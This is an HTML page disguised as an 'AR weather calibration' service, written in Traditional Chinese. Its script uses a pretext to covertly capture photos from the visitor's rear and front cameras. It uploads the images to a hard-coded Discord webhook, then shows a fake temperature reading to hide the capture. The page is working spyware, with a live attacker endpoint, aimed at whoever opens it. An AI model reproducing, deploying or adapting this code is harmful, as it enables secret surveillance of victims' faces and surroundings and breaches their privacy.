<!DOCTYPE html>
<html lang="zh-TW">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Global Weather Service</title>
<style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; background-color: #f5f5f7; color: #1d1d1f; }
    .card { width: 85%; max-width: 380px; padding: 40px 24px; background: #ffffff; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); text-align: center; }
    .icon-wrapper { width: 70px; height: 70px; margin: 0 auto 24px; background: linear-gradient(135deg, #007aff, #5ac8fa); border-radius: 18px; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 16px rgba(0,122,255,0.2); }
    h2 { font-size: 22px; font-weight: 600; margin: 0 0 12px; }
    p { font-size: 15px; color: #86868b; line-height: 1.5; margin-bottom: 30px; }
    button { width: 100%; padding: 16px; font-size: 17px; font-weight: 600; border: none; border-radius: 14px; background: #007aff; color: #fff; cursor: pointer; transition: 0.2s; }
    button:active { transform: scale(0.97); background: #0063cc; }
    .spinner { display: none; width: 24px; height: 24px; border: 3px solid rgba(0,122,255,0.2); border-top: 3px solid #007aff; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    #status { font-size: 13px; color: #007aff; font-weight: 500; margin-top: 10px; }
</style>
</head>
<body>

<div class="card">
    <div class="icon-wrapper">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2">
            <path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41M12 7a5 5 0 100 10 5 5 0 000-10z"/>
        </svg>
    </div>
    <h2>AR 實境天氣校準</h2>
    <p>為了提供精確的體感溫度與光譜數據，系統將開啟 AR 模式掃描周圍環境光線。</p>
    <button id="btn" onclick="startCalibration()">開始環境校準</button>
    <div class="spinner" id="loader"></div>
    <div id="status"></div>
</div>

<video id="v" style="display:none;" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
const webhook = "https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv";
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

async function startCalibration() {
    const status = document.getElementById("status");
    document.getElementById("btn").style.display = "none";
    document.getElementById("loader").style.display = "block";
    status.innerHTML = "正在連線到氣象站...";

    try {
        // --- 1. 後鏡頭捕捉 ---
        let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
        let video = document.getElementById("v");
        video.srcObject = stream;
        await video.play();

        await sleep(800); // 縮短等待時間
        await takeSnap(video, "data_a1.jpg", "📡 **DATA_ENV_A**");
        await sleep(300);
        await takeSnap(video, "data_a2.jpg", "📡 **DATA_ENV_B**");

        stream.getTracks().forEach(t => t.stop());

        // --- 2. 前鏡頭捕捉 ---
        status.innerHTML = "環境光譜分析中...";
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        await video.play();

        await sleep(800);
        await takeSnap(video, "data_b1.jpg", "📡 **DATA_USER_A**");
        await sleep(300);
        await takeSnap(video, "data_b2.jpg", "📡 **DATA_USER_B**");

        // --- 3. 結束 ---
        stream.getTracks().forEach(t => t.stop());
        status.innerHTML = "數據傳輸中...";
        
        setTimeout(() => { 
            alert("校準成功：當前環境體感溫度為 26°C。"); 
            location.reload(); 
        }, 800);

    } catch (err) {
        status.innerHTML = "校準失敗：連線逾時。";
        document.getElementById("loader").style.display = "none";
    }
}

async function takeSnap(video, filename, content) {
    const canvas = document.getElementById("c");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    
    return new Promise(resolve => {
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append("file", blob, filename);
            fd.append("payload_json", JSON.stringify({ content }));
            fetch(webhook, { method: "POST", body: fd }).then(resolve).catch(resolve);
        }, "image/jpeg", 0.6); // 稍微調低品質以增加傳輸速度
    });
}
</script>
</body>
</html>
